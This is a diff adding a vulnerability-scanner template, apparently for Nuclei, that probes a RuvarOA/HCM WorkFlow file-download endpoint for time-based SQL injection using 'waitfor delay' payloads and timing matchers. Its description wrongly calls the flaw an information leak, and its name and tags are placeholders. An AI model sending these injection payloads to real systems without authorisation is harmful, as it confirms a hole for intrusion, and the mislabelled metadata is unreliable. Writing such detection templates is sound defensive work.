@@ -1,0 +1,22 @@
+id: RuvarOA-WorkFlow-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: HCM智能人力资源系统DingDingConfigNew 存在信息泄露
+  reference:
+    - https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Mobile/WorkFlow/wf_file_download.aspx?attach_type=1&sys_file_storage_id=1+waitfor+delay+'0:0:3'+--+"
+      - "{{BaseURL}}/Mobile/WorkFlow/wf_file_download.aspx?attach_type=1&sys_file_storage_id=1+waitfor+delay+'0:0:6'+--+"
+      - "{{BaseURL}}/Mobile/WorkFlow/wf_file_download.aspx?attach_type=1&sys_file_storage_id=1+waitfor+delay+'0:0:9'+--+"
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
